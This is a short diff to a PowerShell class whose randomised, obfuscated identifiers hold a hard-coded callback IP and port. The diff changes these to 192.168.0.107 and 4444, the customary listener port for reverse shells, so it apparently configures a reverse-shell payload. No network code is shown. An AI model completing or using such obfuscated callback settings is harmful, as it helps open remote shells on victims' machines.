@@ -1,7 +1,7 @@
 class kGbChdwCORuigqbGkPaIbIeb {
     
-    [string]$XustEZylVRAOUqqM = "65.0.50.125"
-    [int]$UyTfSwgNmimehpcTqtFJH = 22011
+    [string]$XustEZylVRAOUqqM = "192.168.0.107"
+    [int]$UyTfSwgNmimehpcTqtFJH = 4444
 
     $WEczPxxYUiELOoJSGscAjtA
     $lkzesBewZCaAjGXasu
